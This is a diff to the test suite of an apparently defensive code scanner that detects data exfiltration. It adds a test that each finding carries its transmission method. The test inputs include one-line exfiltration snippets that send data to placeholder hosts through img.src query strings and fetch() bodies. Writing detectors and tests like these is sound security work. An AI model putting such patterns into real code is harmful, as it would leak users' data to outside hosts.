@@ -1664,6 +1664,18 @@ test("data-exfiltration makes a candidate per overt remote transmission only", (
   assert.equal(candidates('img.src = "https://x/?d=" + body;'), 0); // covert
 });
 
+// The transmission method rides on the finding's `hint` (shown on the locus),
+// while `item` stays absent so the recheck key stays the unique file:line.
+test("data-exfiltration labels each locus with the transmission method", () => {
+  const out = dataExfiltration.run(
+    jsCtx('fetch("https://api.example.com/", { body });')
+  );
+  const { findings } = out.llm.resolve(new Map([["X1", { verdict: "fail" }]]));
+  assert.equal(findings.length, 1);
+  assert.equal(findings[0].hint, "fetch()");
+  assert.equal(findings[0].item, null);
+});
+
 test("scanNetworkSinks classifies channel, destination, appended data", () => {
   const one = (code) => scanNetworkSinks(code).hits[0];
   const img = one('img.src = "https://x/?d=" + v;');
